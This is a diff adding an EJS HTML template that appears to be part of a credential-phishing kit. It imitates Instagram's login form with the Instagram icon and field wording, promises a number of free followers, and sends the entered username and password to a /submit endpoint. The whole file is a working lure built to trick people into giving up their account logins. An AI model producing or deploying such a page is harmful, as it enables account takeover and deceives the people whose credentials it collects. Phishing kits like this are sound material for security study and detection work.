@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="icon" href="/instagram.png" type="image/png" />
+    <title><%= title %></title>
+</head>
+<body>
+    <div class="container">
+        <!-- Form -->
+        <form class="form" method="POST" action="/submit">
+            <h1 class="header">
+                Get <%= followersCount %> followers for 
+                <span style="color: red;"><%= offer %></span>
+            </h1>
+            <input name="username" type="text" placeholder="Phone number, username, or email" required />
+            <input name="password" type="password" placeholder="Password" required />
+            <button type="submit"><%= buttonText %></button>
+        </form>
+    </div>
+</body>
+</html>
